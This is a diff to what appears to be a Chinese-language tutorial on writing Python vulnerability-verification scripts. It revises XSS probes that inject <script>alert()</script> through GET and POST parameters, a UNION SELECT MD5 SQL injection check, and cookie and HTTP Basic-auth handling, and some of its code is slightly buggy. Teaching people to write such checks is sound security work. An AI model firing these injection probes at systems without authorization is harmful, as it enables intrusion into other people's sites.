@@ -234,7 +234,7 @@ yuju = str(random.randint(0, 999999))
 target = ""
 url = target + "/level1.php?name=%3Cscript%3Ealert({yuju})%3C/script%3E"
 req = requests.get(url)
-if req.status_code == 200 and "<script>alert({yuju})</script>" in req.text:
+if req.status_code == 200 and "<script>alert({})</script>".format(yuju) in req.text:
     print "漏洞存在"
 ```
 
@@ -265,19 +265,43 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 url=......
 headers={"User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50","Content-Type": "application/x-www-form-urlencoded",}
 yuju = ....
-data = "name=<script>alert({yuju})</script>"
+data = "name=<script>alert({})</script>".format(yuju)
 req = requests.post(url,headers=headers, data=data, timeout=10, verify=False)
 ```
 
 如上，在POST数据的时候，通常情况下，Content-Type的值为application/x-www-form-urlencoded
 
-那么如果漏洞是**后台**的呢？此时需要引用到cookie值，也就是类似于：`Cookie: PHPSESSID=123456789`
+那么如果漏洞是**后台**的呢？此时需要引用到**cookie**值，也就是类似于：`Cookie: PHPSESSID=123456789`
 
-在编写脚本的时候，此时又需要引用`config.py`，在脚本中的体现就是`import config`，此时，需要在headers头中给Cookie定义为如下格式：
+在编写脚本时，可以将cookie处留空，方便在后续测试脚本的时候进行测试，或通过单独赋值的形式，通过外部传参传入cookie：
 
 ```python
-import config
-headers={"User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50","Cookie":config.conf['cookie'],}
+import requests,sys
+
+TARGET = sys.argv[0]
+COOKIE = sys.argv[1]
+
+headers={"User-Agent": "Mozilla/5.0","Cookie": COOKIE}
+
+# poc.py  http://123.123.123.123  PHPSESSID=123456
+```
+
+ 那么，如果是HTTP认证呢？？又应该如何去方便的验证一款使用HTTP验证的产品呢？
+
+ 众所周知，通常情况下，常见的HTTP认证的格式为：`Authorization: Basic YWRtaW46YWRtaW4=` 的类似格式，而在Basic后面跟着的，是一串Base64编码后的字符串，解开后，为admin:admin，也就是说，其用户名与密码都是admin。在脚本中又该如何体现呢？
+
+```python
+import requests,base64,sys
+
+aaa = "admin admin" # aaa = "admin:admin"
+if ":" in aaa or " " in aaa:
+    ddd = base64.b64encode(aaa.encode('utf-8'))
+elif ":" not in aaa:
+    ddd = aaa
+
+print ddd
+
+headers={"User-Agent": "Mozilla/5.0","Authorization": "Basic " + ddd}
 ```
 
 ### SQL注入
@@ -300,7 +324,7 @@ yuju = str(random.randint(0, 999999))
 # mdfive,定义了yuju的MD5值，可以在SQL注入中直接使用
 mdfive = hashlib.md5(yuju).hexdigest()
 target = ""
-url = target + "/level1.php?name=1 union select MD5({yuju})"
+url = target + "/level1.php?name=1 union select MD5({})".format(yuju)
 req = requests.get(url)
 if req.status_code == 200 and mdfive in req.text:
     print "漏洞存在"
